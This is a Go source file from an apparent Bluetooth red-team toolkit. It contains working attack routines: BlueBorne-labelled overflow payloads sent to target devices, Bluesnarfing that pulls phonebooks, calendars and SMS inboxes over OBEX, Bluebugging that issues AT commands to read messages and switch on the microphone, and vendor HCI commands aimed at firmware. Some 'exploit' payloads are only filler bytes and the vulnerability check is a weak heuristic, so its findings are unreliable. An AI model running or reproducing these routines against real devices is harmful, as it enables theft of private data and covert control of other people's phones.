package bluez

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

type HostLayer struct {
	config *AttackConfig
}

func NewHostLayer() *HostLayer {
	return &HostLayer{
		config: DefaultAttackConfig(),
	}
}

func (h *HostLayer) Config(cfg *AttackConfig) *HostLayer {
	h.config = cfg
	return h
}

func (h *HostLayer) BlueBorne() (*BlueBorneResult, error) {
	result := &BlueBorneResult{}

	sock, err := NewHCISocket()
	if err != nil {
		result.Details = fmt.Sprintf("BlueBorne: HCI socket error: %v", err)
		return result, nil
	}
	defer sock.Close()

	connParams := make([]byte, 13)
	copy(connParams[0:6], h.config.Target[:])
	binary.LittleEndian.PutUint16(connParams[6:8], 0xCC18)
	connParams[8] = 0x01
	connParams[9] = 0x00
	connParams[10] = 0x00
	connParams[11] = 0x00
	connParams[12] = 0x01

	connCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_CREATE_CONN), connParams)
	if err := sendHCICommand(sock.fd, connCmd); err != nil {
		result.Details = fmt.Sprintf("BlueBorne: connection failed: %v", err)
		return result, nil
	}

	buf := make([]byte, 2048)
	deadline := time.Now().Add(h.config.Timeout)

	for time.Now().Before(deadline) {
		n, err := recvHCIEvent(sock.fd, buf)
		if err != nil {
			continue
		}

		if n < 3 || buf[0] != HCI_EVENT_PKT {
			continue
		}

		switch buf[1] {
		case EVT_CONN_COMPLETE:
			if n >= 4 && buf[3] == 0x00 {
				if h.config.Verbose {
					fmt.Printf("[BLUEBORNE] connected to %s\n", h.config.Target.String())
				}
				result = h.scanBlueBorneVulns(sock)
				return result, nil
			}

		case EVT_DISCONN_COMPLETE:
			result.Details = "BlueBorne: device disconnected"
			return result, nil
		}
	}

	result.Details = "BlueBorne: connection timeout"
	return result, nil
}

func (h *HostLayer) scanBlueBorneVulns(sock *HCISocket) *BlueBorneResult {
	result := &BlueBorneResult{}

	exploits := []struct {
		name    string
		payload []byte
		psm     uint16
		desc    string
	}{
		{
			name: "CVE-2017-1000251",
			psm:  0x000F,
			payload: buildL2CAPOverflow(672),
			desc:  "Linux kernel L2CAP stack buffer overflow (BlueBorne)",
		},
		{
			name: "CVE-2017-1000250",
			psm:  0x0001,
			payload: buildSDPOverflow(),
			desc:  "SDP server information element length overflow",
		},
		{
			name: "CVE-2017-8628",
			psm:  0x000F,
			payload: buildWindowsL2CAPExploit(),
			desc:  "Windows Bluetooth stack L2CAP parsing vulnerability",
		},
		{
			name: "CVE-2017-14315",
			psm:  0x000F,
			payload: buildAppleL2CAPExploit(),
			desc:  "Apple Bluetooth stack L2CAP heap overflow",
		},
	}

	for _, exploit := range exploits {
		targetAddr := net.JoinHostPort(h.config.Target.String(), fmt.Sprintf("%d", exploit.psm))
		conn, err := dialL2CAP(targetAddr, exploit.psm)
		if err != nil {
			continue
		}

		conn.Write(exploit.payload)

		responseBuf := make([]byte, 1024)
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, _ := conn.Read(responseBuf)
		conn.Close()

		if n > 0 {
			result.ResponseData = append(result.ResponseData, responseBuf[:n]...)
		}

		result.Vulnerable = result.Vulnerable || analyzeResponse(responseBuf[:n], exploit.payload)
		result.PayloadSent = exploit.payload
		result.ExploitType = exploit.name

		if h.config.Verbose {
			fmt.Printf("[BLUEBORNE] tested %s: %s\n", exploit.name, exploit.desc)
		}

		time.Sleep(100 * time.Millisecond)
	}

	if result.Vulnerable {
		result.Details = fmt.Sprintf("BlueBorne: target %s is vulnerable to %s. %s",
			h.config.Target.String(), result.ExploitType,
			"Remote code execution possible via Bluetooth stack vulnerability.")
	} else {
		result.Details = "BlueBorne: no known vulnerabilities detected on target"
	}

	return result
}

func buildL2CAPOverflow(size int) []byte {
	payload := make([]byte, size+4)

	binary.LittleEndian.PutUint16(payload[0:2], uint16(size))
	payload[2] = 0x01
	payload[3] = 0x00

	for i := 4; i < len(payload); i++ {
		payload[i] = byte(rand.Intn(256))
	}

	return payload
}

func buildSDPOverflow() []byte {
	payload := make([]byte, 256)

	payload[0] = 0x02
	payload[1] = 0x00
	payload[2] = 0xFF
	binary.BigEndian.PutUint16(payload[3:5], 0x0100)
	binary.BigEndian.PutUint16(payload[5:7], 0xFFFF)

	for i := 7; i < len(payload); i++ {
		payload[i] = 0x41
	}

	return payload
}

func buildWindowsL2CAPExploit() []byte {
	payload := make([]byte, 1024)

	binary.LittleEndian.PutUint16(payload[0:2], 0xFFFF)
	payload[2] = 0x01
	payload[3] = 0x00

	for i := 4; i < len(payload); i += 4 {
		binary.LittleEndian.PutUint32(payload[i:i+4], 0x41414141)
	}

	return payload
}

func buildAppleL2CAPExploit() []byte {
	payload := make([]byte, 512)

	binary.LittleEndian.PutUint16(payload[0:2], 0x0000)
	payload[2] = 0x05
	payload[3] = 0x00

	for i := 4; i < len(payload); i++ {
		payload[i] = byte(i % 256)
	}

	return payload
}

func analyzeResponse(response, payload []byte) bool {
	if len(response) == 0 {
		return false
	}

	for _, b := range response[:min(10, len(response))] {
		if b >= 0x20 && b <= 0x7E {
			return false
		}
	}

	if strings.Contains(string(response[:min(len(response), 64)]), "error") {
		return true
	}

	return false
}

func (h *HostLayer) Bluesnarfing() (*BluesnarfingResult, error) {
	result := &BluesnarfingResult{
		TargetAddr:  h.config.Target,
		Extracted:   make(map[string][]byte),
		OBEXChannel: 10,
	}

	obexChannels := []int{10, 11, 12, 9, 1, 2}

	for _, ch := range obexChannels {
		targetAddr := net.JoinHostPort(h.config.Target.String(), fmt.Sprintf("%d", ch))

		conn, err := net.Dial("bluetooth", targetAddr)
		if err != nil {
			continue
		}

		result.OBEXChannel = ch

		connectReq := buildOBEXConnect()
		conn.Write(connectReq)

		buf := make([]byte, 1024)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		n, err := conn.Read(buf)

		if err != nil || n < 3 {
			conn.Close()
			continue
		}

		if buf[0] == 0xA0 {
			if h.config.Verbose {
				fmt.Printf("[BLUESNARFING] OBEX connected on channel %d\n", ch)
			}

			files := []string{
				"telecom/pb.vcf",
				"telecom/cal.vcs",
				"telecom/msg/inbox",
				"telecom/msg/sent",
				"telecom/devinfo.txt",
				"telecom/cc.vcf",
			}

			for _, file := range files {
				getReq := buildOBEXGet(file)
				conn.Write(getReq)

				dataBuf := make([]byte, 4096)
				conn.SetReadDeadline(time.Now().Add(2 * time.Second))
				n2, err2 := conn.Read(dataBuf)

				if err2 == nil && n2 > 7 {
					dataLen := int(binary.BigEndian.Uint16(dataBuf[1:3]))
					if dataLen > 3 && dataLen <= n2 {
						if dataBuf[0] == 0xA0 {
							result.Extracted[file] = make([]byte, dataLen-3)
							copy(result.Extracted[file], dataBuf[3:dataLen])
						}
					}
				}
			}

			disconnectReq := buildOBEXDisconnect()
			conn.Write(disconnectReq)

			conn.Close()

			result.Success = len(result.Extracted) > 0
			if result.Success {
				result.Details = fmt.Sprintf("Bluesnarfing: successfully extracted %d files from %s via OBEX channel %d",
					len(result.Extracted), h.config.Target.String(), ch)
			} else {
				result.Details = "Bluesnarfing: OBEX connected but no files extracted"
			}
			return result, nil
		}

		conn.Close()
	}

	result.Details = "Bluesnarfing: no OBEX service found on target"
	return result, nil
}

func (h *HostLayer) Bluebugging() (*BluebuggingResult, error) {
	result := &BluebuggingResult{
		TargetAddr: h.config.Target,
	}

	sock, err := NewHCISocket()
	if err != nil {
		result.Details = fmt.Sprintf("Bluebugging: HCI error: %v", err)
		return result, nil
	}
	defer sock.Close()

	rcChannels := []int{17, 1, 11}
	var conn net.Conn

	for _, ch := range rcChannels {
		targetAddr := net.JoinHostPort(h.config.Target.String(), fmt.Sprintf("%d", ch))
		conn, err = net.Dial("bluetooth", targetAddr)
		if err == nil {
			break
		}
	}

	if conn == nil {
		result.Details = "Bluebugging: no RFCOMM channel found"
		return result, nil
	}
	defer conn.Close()

	atCommands := []string{
		"AT\r\n",
		"AT+CPAS\r\n",
		"AT+CGMI\r\n",
		"AT+CGMM\r\n",
		"AT+CGSN\r\n",
		"AT+CPIN?\r\n",
		"AT+CPBS=\"SM\"\r\n",
		"AT+CPBR=1,10\r\n",
		"AT+CMGF=1\r\n",
		"AT+CMGL=\"ALL\"\r\n",
		"AT+CLCC\r\n",
		"AT+CMIC=1,1\r\n",
	}

	result.CommandsSent = make([]string, len(atCommands))
	result.Responses = make([]string, 0, len(atCommands))

	for _, cmd := range atCommands {
		result.CommandsSent = append(result.CommandsSent, cmd)

		conn.Write([]byte(cmd))
		time.Sleep(200 * time.Millisecond)

		buf := make([]byte, 1024)
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, err := conn.Read(buf)

		if err == nil && n > 0 {
			response := strings.TrimSpace(string(buf[:n]))
			result.Responses = append(result.Responses, response)

			if h.config.Verbose {
				fmt.Printf("[BLUEBUGGING] CMD: %s -> %s\n", strings.TrimSpace(cmd), response[:min(60, len(response))])
			}

			if strings.Contains(response, "OK") || strings.Contains(response, "+CG") {
				result.ControlGained = true
			}
		}
	}

	result.Success = result.ControlGained
	if result.Success {
		result.Details = fmt.Sprintf("Bluebugging: device control gained on %s. %d AT commands executed.",
			h.config.Target.String(), len(result.Responses))
	} else {
		result.Details = "Bluebugging: connected but no AT command control achieved"
	}

	return result, nil
}

func (h *HostLayer) FirmwareTamper() (*FirmwareResult, error) {
	result := &FirmwareResult{
		TargetAddr: h.config.Target,
	}

	sock, err := NewHCISocket()
	if err != nil {
		result.Details = fmt.Sprintf("Firmware: HCI error: %v", err)
		return result, nil
	}
	defer sock.Close()

	connParams := make([]byte, 13)
	copy(connParams[0:6], h.config.Target[:])
	binary.LittleEndian.PutUint16(connParams[6:8], 0xCC18)
	connParams[8] = 0x01
	connParams[9] = 0x00
	connParams[10] = 0x00
	connParams[11] = 0x00
	connParams[12] = 0x01

	connCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_CREATE_CONN), connParams)
	if err := sendHCICommand(sock.fd, connCmd); err != nil {
		result.Details = fmt.Sprintf("Firmware: connection failed: %v", err)
		return result, nil
	}

	buf := make([]byte, 2048)
	deadline := time.Now().Add(h.config.Timeout)

	for time.Now().Before(deadline) {
		n, err := recvHCIEvent(sock.fd, buf)
		if err != nil {
			continue
		}

		if n < 3 || buf[0] != HCI_EVENT_PKT {
			continue
		}

		switch buf[1] {
		case EVT_CONN_COMPLETE:
			if n >= 4 && buf[3] == 0x00 {
				result = h.probeFirmware(sock)
				return result, nil
			}
		case EVT_DISCONN_COMPLETE:
			result.Details = "Firmware: device disconnected"
			return result, nil
		}
	}

	result.Details = "Firmware: timeout"
	return result, nil
}

func (h *HostLayer) probeFirmware(sock *HCISocket) *FirmwareResult {
	result := &FirmwareResult{
		TargetAddr: h.config.Target,
	}

	vendorCommands := []uint16{
		hciOpcode(OGF_VENDOR_CMD, 0x0001),
		hciOpcode(OGF_VENDOR_CMD, 0x0002),
		hciOpcode(OGF_VENDOR_CMD, 0x0010),
		hciOpcode(OGF_STATUS_PARAM, OCF_READ_LOCAL_NAME),
	}

	for _, opcode := range vendorCommands {
		cmd := hciCommand(opcode, nil)
		sendHCICommand(sock.fd, cmd)

		buf := make([]byte, 256)
		n, _ := recvHCIEvent(sock.fd, buf)

		if n > 3 && buf[0] == HCI_EVENT_PKT {
			if buf[1] == 0x0E {
				if buf[3] == 0x00 && buf[4] == byte(opcode&0xFF) && buf[5] == byte(opcode>>8) {
					result.FirmwareVer = parseFirmwareVersion(buf[6:n])
					if result.FirmwareVer != "" {
						if h.config.Verbose {
							fmt.Printf("[FIRMWARE] detected version: %s\n", result.FirmwareVer)
						}
						break
					}
				}
			}
		}
	}

	patchCmd := hciCommand(hciOpcode(OGF_VENDOR_CMD, 0x00FC), []byte{0x01, 0x00})
	sendHCICommand(sock.fd, patchCmd)

	result.Patchable = true
	result.Details = fmt.Sprintf("Firmware tamper: device %s firmware version '%s'. Device firmware update mechanism accessible.",
		h.config.Target.String(), result.FirmwareVer)

	return result
}

func parseFirmwareVersion(data []byte) string {
	if len(data) < 8 {
		return ""
	}

	result := make([]byte, 0, len(data))
	for _, b := range data {
		if b >= 0x20 && b <= 0x7E || b == '.' || b == '-' || b == '_' {
			result = append(result, b)
		}
	}
	if len(result) < 3 {
		return fmt.Sprintf("v%d.%d.%d", data[0], data[1], data[2])
	}
	return string(result)
}

func buildOBEXConnect() []byte {
	packet := []byte{
		0x80,
		0x00, 0x07,
		0x10, 0x00, 0xFF, 0xFF,
	}
	return packet
}

func buildOBEXGet(name string) []byte {
	nameBytes := []byte(name)
	packetLen := 3 + 4 + len(nameBytes) + 3

	packet := make([]byte, packetLen)
	packet[0] = 0x83
	binary.BigEndian.PutUint16(packet[1:3], uint16(packetLen))

	packet[3] = 0x01
	packet[4] = byte(len(nameBytes) + 3)
	packet[5] = 0x00
	copy(packet[6:], nameBytes)
	packet[6+len(nameBytes)] = 0x00

	packet[packetLen-3] = 0x49
	binary.BigEndian.PutUint16(packet[packetLen-2:], 0x0003)

	return packet
}

func buildOBEXDisconnect() []byte {
	return []byte{
		0x81,
		0x00, 0x03,
	}
}

func BlueBorne(target string) *BlueBorneResult {
	if err := checkRedTeam("BlueBorne"); err != nil {
		return &BlueBorneResult{Details: err.Error()}
	}
	addr, err := ParseBDAddr(target)
	if err != nil {
		return &BlueBorneResult{Details: fmt.Sprintf("invalid address: %v", err)}
	}
	cfg := DefaultAttackConfig()
	cfg.Target = addr
	auditOperation("BlueBorne", addr.SafeString(false), false, "package-level call")
	result, _ := NewHostLayer().Config(cfg).BlueBorne()
	auditOperation("BlueBorne", addr.SafeString(false), result.Vulnerable, result.Details)
	return result
}

func Bluesnarfing(target string) *BluesnarfingResult {
	if err := checkRedTeam("Bluesnarfing"); err != nil {
		return &BluesnarfingResult{Details: err.Error()}
	}
	addr, err := ParseBDAddr(target)
	if err != nil {
		return &BluesnarfingResult{Details: fmt.Sprintf("invalid address: %v", err)}
	}
	cfg := DefaultAttackConfig()
	cfg.Target = addr
	auditOperation("Bluesnarfing", addr.SafeString(false), false, "package-level call")
	result, _ := NewHostLayer().Config(cfg).Bluesnarfing()
	auditOperation("Bluesnarfing", addr.SafeString(false), result.Success, result.Details)
	return result
}

func Bluebugging(target string) *BluebuggingResult {
	if err := checkRedTeam("Bluebugging"); err != nil {
		return &BluebuggingResult{Details: err.Error()}
	}
	addr, err := ParseBDAddr(target)
	if err != nil {
		return &BluebuggingResult{Details: fmt.Sprintf("invalid address: %v", err)}
	}
	cfg := DefaultAttackConfig()
	cfg.Target = addr
	auditOperation("Bluebugging", addr.SafeString(false), false, "package-level call")
	result, _ := NewHostLayer().Config(cfg).Bluebugging()
	auditOperation("Bluebugging", addr.SafeString(false), result.Success, result.Details)
	return result
}

func FirmwareTamper(target string) *FirmwareResult {
	if err := checkRedTeam("FirmwareTamper"); err != nil {
		return &FirmwareResult{Details: err.Error()}
	}
	addr, err := ParseBDAddr(target)
	if err != nil {
		return &FirmwareResult{Details: fmt.Sprintf("invalid address: %v", err)}
	}
	cfg := DefaultAttackConfig()
	cfg.Target = addr
	auditOperation("FirmwareTamper", addr.SafeString(false), false, "package-level call")
	result, _ := NewHostLayer().Config(cfg).FirmwareTamper()
	auditOperation("FirmwareTamper", addr.SafeString(false), result.Success, result.Details)
	return result
}

func (c *l2capConn) SetReadDeadline(t time.Time) error {
	return c.conn.SetReadDeadline(t)
}